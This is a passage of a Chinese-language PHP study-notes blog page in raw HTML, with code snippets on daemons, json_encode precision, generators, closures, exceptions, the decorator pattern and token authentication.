class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编写一个简单daemon程序https://learnku.com/articles/30595</span></span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">            <span class="comment">// 2.子进程逻辑</span></span><br><span class="line">            $mypid = posix_getpid();</span><br><span class="line">            <span class="comment">//echo "Son pid is $mypid\n";</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.升级组长进程</span></span><br><span class="line">            <span class="keyword">if</span> (!$sid = posix_setsid()) &#123;</span><br><span class="line">                    exit(<span class="string">"Set sid error\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4.防止组长进程再次控制终端</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">-1</span> == pcntl_fork()) &#123;</span><br><span class="line">                    exit(<span class="string">"Fork error\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.标准输入/输出/错误</span></span><br><span class="line">            fclose(STDIN);</span><br><span class="line">            fclose(STDOUT);</span><br><span class="line">            fclose(STDERR);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6.改变目录</span></span><br><span class="line">            chdir(<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.重设掩码</span></span><br><span class="line">            umask(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="comment">// fork err</span></span><br><span class="line">            exit(<span class="string">"Fork error\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 1.父进程逻辑</span></span><br><span class="line">            $mypid = posix_getpid();</span><br><span class="line">            <span class="comment">//echo "Parent pid is $mypid\n";</span></span><br><span class="line">            exit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10000</span>; $i ++) &#123;</span><br><span class="line">        file_put_contents(<span class="string">"/tmp/wutao.log"</span>, <span class="string">"i=$i\n"</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<h3 id="JSON-encode-精度缺失"><a href="#JSON-encode-精度缺失" class="headerlink" title="JSON_encode () 精度缺失"></a>JSON_encode () 精度缺失</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  $info = <span class="number">26.54</span>;</span><br><span class="line">    $res = json_encode($info);</span><br><span class="line">    var_dump($res);</span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">string(<span class="number">18</span>) <span class="string">"26.539999999999999"</span></span><br><span class="line"></span><br><span class="line">serialize_precision = <span class="number">16</span></span><br><span class="line">&gt;&gt;&gt; ini_get(<span class="string">'serialize_precision'</span>)</span><br><span class="line">=&gt; <span class="string">"17"</span></span><br><span class="line">&gt;&gt;&gt; ini_set(<span class="string">'serialize_precision'</span>,<span class="number">16</span>)</span><br><span class="line">=&gt; <span class="string">"17"</span></span><br><span class="line">&gt;&gt;&gt; json_encode($info);</span><br><span class="line">=&gt; <span class="string">"26.54"</span></span><br></pre></td></tr></table></figure>
<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRange</span> (<span class="params">$max = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; $max; $i++) &#123;</span><br><span class="line">        $injected = <span class="keyword">yield</span> $i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($injected === <span class="string">'stop'</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$generator = getRange(PHP_INT_MAX);</span><br><span class="line">传递参数到生成器中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach ($generator <span class="keyword">as</span> $range) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($range === <span class="number">10000</span>) &#123;</span><br><span class="line">        $generator-&gt;send(<span class="string">'stop'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo <span class="string">"Dataset &#123;$range&#125; &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">注意: 在生成器中使用 <span class="keyword">return</span> ，会跳出生成器。</span><br><span class="line">https:<span class="comment">//learnku.com/php/t/28336</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串分割"><a href="#字符串分割" class="headerlink" title="字符串分割"></a>字符串分割</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="string">'#本科 &amp; 硕士 @博士 - 教授'</span>;</span><br><span class="line">        $limit1 = array(<span class="string">'#'</span>, <span class="string">'&amp;'</span>, <span class="string">'@'</span>, <span class="string">'-'</span>);</span><br><span class="line">        $limit2 = array(<span class="string">'$#$'</span>, <span class="string">'$&amp;$'</span>, <span class="string">'$@$'</span>, <span class="string">'$-$'</span>);</span><br><span class="line">        $str2 = str_replace($limit1, $limit2, $str);</span><br><span class="line">        $arr = array();</span><br><span class="line">        $arr1 = array_values(array_filter(explode(<span class="string">'$'</span>, $str2)));</span><br><span class="line">        foreach ($arr1 <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($k % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                $arr[] = array($v, $arr1[$k + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print_r($arr);      https:<span class="comment">//learnku.com/index.php/laravel/t/30777</span></span><br><span class="line">      $string = <span class="string">'#本科 &amp; 硕士 @博士 - 教授'</span>;</span><br><span class="line">      $matches = [];</span><br><span class="line">      preg_match_all(<span class="string">'/([#|&amp;|@|\-])([^#|&amp;|@|\-]*)/'</span>, $string, $matches);</span><br><span class="line">      </span><br><span class="line">      $signArr = array_map(<span class="string">'trim'</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">      $titleArr = array_map(<span class="string">'trim'</span>, $matches[<span class="number">2</span>]);</span><br><span class="line">      # 在这以下的代码你可以自由发挥了</span><br><span class="line">      $data = [];</span><br><span class="line">      $minCount = min(count($signArr), $titleArr);</span><br><span class="line">      <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;$minCount; $i++)</span><br><span class="line">      &#123;</span><br><span class="line">          $data[] = [</span><br><span class="line">              $signArr[$i],</span><br><span class="line">              $titleArr[$i],</span><br><span class="line">          ];</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<h3 id="闭包和匿名函数"><a href="#闭包和匿名函数" class="headerlink" title="闭包和匿名函数"></a>闭包和匿名函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFunc1</span>(<span class="params">Closure $closure</span>) </span>&#123;</span><br><span class="line">    $closure();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFunc2</span>(<span class="params">Callable $callback</span>) </span>&#123;</span><br><span class="line">    $callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xy</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'Hello, World!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$<span class="function"><span class="keyword">function</span> = <span class="title">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo <span class="string">'Hello, World!'</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">callFunc1(<span class="string">"xy"</span>); <span class="comment">// Catchable fatal error: Argument 1 passed to callFunc1() must be an instance of Closure, string given</span></span><br><span class="line">callFunc2(<span class="string">"xy"</span>); <span class="comment">// Hello, World!</span></span><br><span class="line"></span><br><span class="line">callFunc1($<span class="function"><span class="keyword">function</span>); // <span class="title">Hello</span>, <span class="title">World</span>!</span></span><br><span class="line"><span class="function"><span class="title">callFunc2</span>(<span class="params">$function</span>); // <span class="title">Hello</span>, <span class="title">World</span>!</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//从<span class="title">php7</span>.1开始可以使用以下代码转换</span></span><br><span class="line"><span class="function"><span class="title">callFunc1</span>(<span class="params">Closure::fromCallable(<span class="string">"xy"</span></span>))</span></span><br><span class="line"><span class="function">其中 <span class="title">callable</span> 参数可以为</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params"><span class="string">'functionName'</span></span>); </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">[$foo, <span class="string">'bar'</span>]</span>);//<span class="title">$foo</span>-&gt;<span class="title">bar</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">[<span class="string">'foo'</span>,<span class="string">'bar'</span>]</span>);//<span class="title">foo</span>::<span class="title">bar</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">function(</span>)</span>&#123;&#125;);<span class="comment">//closure</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">subscribeSellOrder</span>(<span class="params">SellOrderProcess $sellOrderProcess</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $closure = self::makeClosure($sellOrderProcess, <span class="string">'sellOrdersProcess'</span>);</span><br><span class="line">  $<span class="keyword">this</span>-&gt;redis-&gt;subscribe(RtdataConst::SELL_CHANNEL_NAME, $closure);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">makeClosure</span>(<span class="params">$obj, $method</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Closure::fromCallable([$obj, $method]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/index.php/articles/30767</span></span><br></pre></td></tr></table></figure>
<h3 id="curl绑定host"><a href="#curl绑定host" class="headerlink" title="curl绑定host"></a>curl绑定host</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxx.cn 测试的host为<span class="number">172.16</span><span class="number">.252</span><span class="number">.2</span></span><br><span class="line">$url = <span class="string">"http://172.16.252.2/api/test"</span>;</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([<span class="string">'emitter'</span> =&gt; <span class="keyword">new</span> \App\Services\GuzzleEmitter(<span class="string">'test'</span>)]);</span><br><span class="line">$response = $client-&gt;get($url,array(<span class="string">"timeout"</span>=&gt;<span class="number">3</span>,<span class="string">"connect_timeout"</span>=&gt;<span class="number">2</span>,<span class="string">'headers'</span>=&gt;[<span class="string">'host'</span>=&gt;<span class="string">'xxx.cn'</span>]));</span><br></pre></td></tr></table></figure>
<h3 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/25813</span></span><br><span class="line">错误并不能被 <span class="keyword">try</span> <span class="keyword">catch</span> 捕捉</span><br><span class="line">Parse error 解析错误   Fatal error 致命错误  Warning 警告  Notice 注意</span><br><span class="line">error_report 设置错误的报告级别error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">set_error_handler 设置用户自定义的错误处理函数</span><br><span class="line">set_error_handler(<span class="string">'myErrorFun'</span>); <span class="comment">//把php原始的错误处理机制，变成我们的myErrorFun函数处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myErrorFun</span>(<span class="params">$errno, $message, $file, $line</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    echo <span class="string">'错误码是：'</span>.$errno.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'错误的信息是'</span>.$message.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'错误的文件是：'</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'错误的行数是'</span>.$line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $a; <span class="comment">//a是未定义的变量</span></span><br><span class="line">错误是由于 php 脚本自身的问题导致的和逻辑无关，异常则是由于逻辑问题导致的</span><br><span class="line">在 php7 之前错误不能用 <span class="keyword">try</span> <span class="keyword">catch</span> 捕获，异常可以 </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"大江东去，浪淘尽，千古风流人物"</span>); <span class="comment">//抛出异常</span></span><br><span class="line">异常必须要手动抛出才行否则捕获不到 手动抛出异常是 php 比较鸡肋的地方，异常必须要手动抛出，才能捕获到，但是既然已经知道哪里会发生异常，直接规避不就可以了吗？或者重写逻辑，这可能是 php 比较特殊的地方吧</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123; <span class="comment">//系统内置的异常处理类</span></span><br><span class="line">    echo $e-&gt;getMessage(); <span class="comment">//获取异常信息</span></span><br><span class="line">&#125;</span><br><span class="line">自定义的异常处理函数，用来处理没有用 <span class="keyword">try</span> <span class="keyword">catch</span> 捕获的异常，如果你抛出的异常无人捕获，那么就会进入该方法 </span><br><span class="line">set_exception_handler(<span class="string">'myexception'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myexception</span>(<span class="params">$exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    var_dump($exception-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"测试一下自定义异常处理函"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">封装，继承，多态</span><br><span class="line"></span><br><span class="line">什么是封装？</span><br><span class="line"></span><br><span class="line">把客观的事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的类进行信息的隐藏。简单的说就是：封装使对象的设计者与对象的使用者分开，使用者只要知道对象可以做什么就可以了，不需要知道具体是怎么实现的。封装可以有助于提高类和系统的安全性。</span><br><span class="line"></span><br><span class="line">什么是继承？</span><br><span class="line"></span><br><span class="line">继承指的是建立一个新的派生类，从一个或多个先前定义的类中继承数据和函数，可以重新定义或加进新数据和函数，从而建立了类的层次或等级。</span><br><span class="line"></span><br><span class="line">什么是多态？</span><br><span class="line"></span><br><span class="line">多态性指的是： 同一操作作用与不同类的实例，将产生不同的执行结果，即不同类的对象收到相同的消息时，将得到不同的结果。</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出一个字符串</span></span><br><span class="line"><span class="comment"> * 装饰器动态添加功能</span></span><br><span class="line"><span class="comment"> * Class EchoText</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoText</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $decorator = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//调用装饰器前置操作</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;beforeEcho();</span><br><span class="line">        echo <span class="string">"你好，我是装饰器。"</span>;</span><br><span class="line">        <span class="comment">//调用装饰器后置操作</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;afterEcho();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//增加装饰器</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addDecorator</span>(<span class="params">Decorator $decorator</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;decorator[] = $decorator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行装饰器前置操作 先进先出原则</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">beforeEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;decorator <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;before();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行装饰器后置操作 先进后出原则</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">afterEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tmp = array_reverse($<span class="keyword">this</span>-&gt;decorator);</span><br><span class="line">        foreach ($tmp <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;after();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 装饰器接口</span></span><br><span class="line"><span class="comment"> * Class Decorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface Decorator</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">public</span> <span class="title">function</span> <span class="title">after</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/**</span></span><br><span class="line"><span class="function"> * 颜色装饰器实现</span></span><br><span class="line"><span class="function"> * <span class="title">Class</span> <span class="title">ColorDecorator</span></span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ColorDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    protected $color;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$color</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字体大小装饰器实现</span></span><br><span class="line"><span class="comment"> * Class SizeDecorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SizeDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $size;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$size</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;size = $size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化输出类</span></span><br><span class="line">$echo = <span class="keyword">new</span> EchoText();</span><br><span class="line"><span class="comment">//增加装饰器</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> ColorDecorator(<span class="string">'red'</span>));</span><br><span class="line"><span class="comment">//增加装饰器</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> SizeDecorator(<span class="string">'22'</span>));</span><br><span class="line"><span class="comment">//输出https://learnku.com/articles/30034</span></span><br><span class="line">$echo-&gt;Index();</span><br></pre></td></tr></table></figure>
<h3 id="理解-cookie、session、token"><a href="#理解-cookie、session、token" class="headerlink" title="理解 cookie、session、token"></a>理解 cookie、session、token</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">session这对服务器说是一个巨大的开销 ， 严重的限制了服务器扩展能力， 比如说我用两个机器组成了一个集群， 小 F 通过机器 A 登录了系统， 那 session id 会保存在机器 A 上， 假设小 F 的下一次请求被转发到机器 B 怎么办？机器 B 可没有小 F 的 session id 啊。有时候会采用一点小伎俩：session sticky ， 就是让小 F 的请求一直粘连在机器 A 上， 但是这也不管用， 要是机器 A 挂掉了， 还得转到机器 B 去。那只好做 session 的复制了， 把 session id 在两个机器之间搬来搬去， 快累死了。</span><br><span class="line">小 F 已经登录了系统， 我给他发一个令牌 token， 里边包含了小 F 的 user id， 下一次小 F 再次通过 Http 请求访问我的时候， 把这个 token 通过 Http header 带过来不就可以了。*</span><br><span class="line"></span><br><span class="line">不过这和 session id 没有本质区别啊， 任何人都可以可以伪造， 所以我得想点儿办法， 让别人伪造不了。</span><br><span class="line"></span><br><span class="line">那就对数据做一个签名吧， 比如说我用 HMAC-SHA256 算法，加上一个只有我才知道的密钥， 对数据做一个签名， 把这个签名和数据一起作为 token， 由于密钥别人不知道， 就无法伪造 token 了。</span><br><span class="line"></span><br><span class="line">基于 Token 的身份验证的过程如下:</span><br><span class="line"></span><br><span class="line">用户通过用户名和密码发送请求。</span><br><span class="line">程序验证。</span><br><span class="line">程序返回一个签名的 token 给客户端。</span><br><span class="line">客户端储存 token, 并且每次用于每次发送请求。</span><br><span class="line">服务端验证 token 并返回数据。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30051</span></span><br></pre></td></tr></table></figure>
